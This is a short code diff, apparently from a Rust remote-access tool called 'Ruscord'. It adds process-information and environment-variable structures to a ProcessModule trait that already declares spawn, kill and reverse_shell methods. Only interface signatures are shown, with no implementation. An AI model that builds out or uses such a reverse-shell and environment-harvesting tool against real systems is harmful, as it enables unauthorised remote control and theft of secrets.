@@ -36,19 +36,33 @@ pub mod recon {
 }
 
 pub mod process {
-	use std::{future::Future, net::IpAddr, pin::Pin};
+	use std::{ffi::OsString, future::Future, net::IpAddr, pin::Pin};
 
-	use crate::RuscordError;
+	use crate::{RuscordError, RuscordResult};
+
+	#[derive(Debug)]
+	pub struct EnvironmentVariable {
+		pub key: String,
+		pub value: String,
+	}
+
+	#[derive(Debug)]
+	pub struct CurrentProcessInfo {
+		pub name: OsString,
+		pub pid: u32,
+		pub ppid: u32,
+		pub env_variables: Vec<EnvironmentVariable>,
+	}
 
 	pub trait ProcessModule {
 		/// Spawns a new process on the host with the given name and arguments,
 		/// returning the PID of the new process.
-		fn spawn(&self, name: &str, args: Option<String>) -> Result<(), RuscordError>;
+		fn spawn(&self, name: &str, args: Option<String>) -> RuscordResult<()>;
 
 		/// Kills the process with the given pid and exit code.
 		///
 		/// If no exit code is provided, a default exit code of 0 will be used.
-		fn kill_other(&self, pid: u32, exit_code: Option<u32>) -> Result<(), RuscordError>;
+		fn kill_other(&self, pid: u32, exit_code: Option<u32>) -> RuscordResult<()>;
 
 		/// Kills the current process.
 		///
@@ -59,5 +73,7 @@ pub mod process {
 		fn reverse_shell(
 			&self, ip: IpAddr, port: u16,
 		) -> Pin<Box<dyn Future<Output = Result<(), RuscordError>> + Send + Sync>>;
+
+		fn process_info(&self) -> RuscordResult<CurrentProcessInfo>;
 	}
 }
